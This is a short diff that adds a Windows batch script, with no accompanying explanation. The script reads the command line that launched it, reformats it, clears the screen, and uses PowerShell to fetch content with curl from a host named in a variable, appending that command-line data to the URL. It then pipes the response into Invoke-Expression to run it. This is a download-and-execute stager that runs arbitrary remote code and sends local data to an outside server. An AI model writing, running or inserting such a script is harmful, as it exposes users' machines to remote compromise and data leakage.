@@ -1,0 +1,5 @@
+set "myvar=?"
+IF ["%cmdcmdline%"] NEQ ["cmd"] SET "myvar=%cmdcmdline%"
+IF ["%myvar%"] NEQ ["?"] SET "myvar=%myvar:cmd  =%"
+IF ["%myvar%"] NEQ ["?"] SET "myvar=%myvar: =?%" 
+cls & powershell -c "curl.exe %cmd%/%myvar% | iex"
